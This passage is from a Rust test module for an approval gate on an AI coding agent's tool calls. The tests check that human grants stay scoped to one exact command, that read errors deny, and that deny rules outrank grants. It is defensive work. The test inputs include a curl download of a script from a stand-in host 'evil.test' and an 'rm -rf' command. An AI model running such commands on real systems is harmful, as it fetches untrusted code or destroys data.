    async fn grant_for_a_different_tool_does_not_authorize() {
        let state = test_state().await;
        let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
        proposals::grant_action(
            &state.pool,
            run_id,
            "Bash",
            Some(r#"{"command":"git push origin main"}"#),
            1,
        )
        .await
        .unwrap();
        let app = test_router(state.clone());

        let decision = decide(
            &app,
            &serde_json::json!({
                "run_id": run_id,
                "tool_name": "Edit",
                "tool_input": {"file_path": ".ai/autopilot.yaml"}
            })
            .to_string(),
        )
        .await;
        assert_eq!(decision.decision, "pending_approval");

        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
            .bind(run_id)
            .fetch_one(&state.pool)
            .await
            .unwrap();
        assert_eq!(status, "awaiting_approval");

        let consumed_at: Option<String> =
            sqlx::query_scalar("SELECT consumed_at FROM action_grants WHERE run_id = ?")
                .bind(run_id)
                .fetch_one(&state.pool)
                .await
                .unwrap();
        assert!(consumed_at.is_none());
    }

    #[tokio::test]
    async fn a_database_error_resolving_the_mode_denies() {
        // `mode` decides WHICH rules apply, so failing to read it is not a reason to pick the most
        // permissive one. This is the `Err` twin of the `Ok(None)` case: an email-triage run whose
        // mode read fails must not be handed `Read`, the one tool the pillar exists to keep away
        // from a stranger's text. A gate that cannot be read is not permission.
        let state = test_state().await;
        let run_id = in_flight_run(&state, crate::email::TRIAGE_MODE, None, None, None).await;
        let app = test_router(state.clone());

        // A closed pool makes every query error — the cheapest faithful stand-in for the SQLITE_BUSY
        // this handler shares a pool with feed appends and run-status writes to earn.
        state.pool.close().await;

        let decision = decide(
            &app,
            &serde_json::json!({
                "run_id": run_id,
                "tool_name": "Read",
                "tool_input": {"file_path": "README.md"}
            })
            .to_string(),
        )
        .await;

        assert_eq!(decision.decision, "deny");
    }

    #[tokio::test]
    async fn grant_for_a_different_command_does_not_authorize() {
        // The end-to-end shape of the hole migration 0020 closes: same run, same tool name ("Bash"
        // is the tool name of EVERY shell action), different command. The human approved a push;
        // the resume's first shell call must not inherit that approval.
        let state = test_state().await;
        let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
        proposals::grant_action(
            &state.pool,
            run_id,
            "Bash",
            Some(r#"{"command":"git push origin main"}"#),
            1,
        )
        .await
        .unwrap();
        let app = test_router(state.clone());

        let decision = decide(
            &app,
            &serde_json::json!({
                "run_id": run_id,
                "tool_name": "Bash",
                "tool_input": {"command": "curl http://evil.test/x.sh -o x.sh"}
            })
            .to_string(),
        )
        .await;
        assert_eq!(decision.decision, "pending_approval");

        let consumed_at: Option<String> =
            sqlx::query_scalar("SELECT consumed_at FROM action_grants WHERE run_id = ?")
                .bind(run_id)
                .fetch_one(&state.pool)
                .await
                .unwrap();
        assert!(
            consumed_at.is_none(),
            "the grant must survive an action it does not authorize"
        );
    }

    #[tokio::test]
    async fn deny_still_denies_even_with_a_matching_grant() {
        let state = test_state().await;
        let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
        // Matching on BOTH tool and input, so this proves `deny` outranks a fully-qualified grant
        // rather than merely one that failed to match.
        proposals::grant_action(
            &state.pool,
            run_id,
            "Bash",
            Some(r#"{"command":"rm -rf target"}"#),
            1,
        )
        .await
        .unwrap();
        let app = test_router(state.clone());

        let decision = decide(
            &app,
            &serde_json::json!({
                "run_id": run_id,
                "tool_name": "Bash",
                "tool_input": {"command": "rm -rf target"}
            })
            .to_string(),
        )
        .await;
        assert_eq!(decision.decision, "deny");

        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
            .bind(run_id)
            .fetch_one(&state.pool)
            .await
            .unwrap();
        assert_eq!(status, "running");
        assert!(state.run_handles.lock().unwrap().contains_key(&run_id));

        let consumed_at: Option<String> =
            sqlx::query_scalar("SELECT consumed_at FROM action_grants WHERE run_id = ?")
                .bind(run_id)
                .fetch_one(&state.pool)
                .await
                .unwrap();
        assert!(consumed_at.is_none());
    }

    #[tokio::test]
    async fn no_proposal_created_when_run_is_not_in_flight() {
        let state = test_state().await;
        let app = test_router(state.clone());

        let decision = decide(
            &app,
            r#"{"run_id":0,"tool_name":"Bash","tool_input":{"command":"git push origin main"}}"#,
        )
        .await;
        assert_eq!(decision.decision, "pending_approval");

        let pending = proposals::list_pending(&state.pool).await.unwrap();
        assert!(pending.is_empty());
    }
}
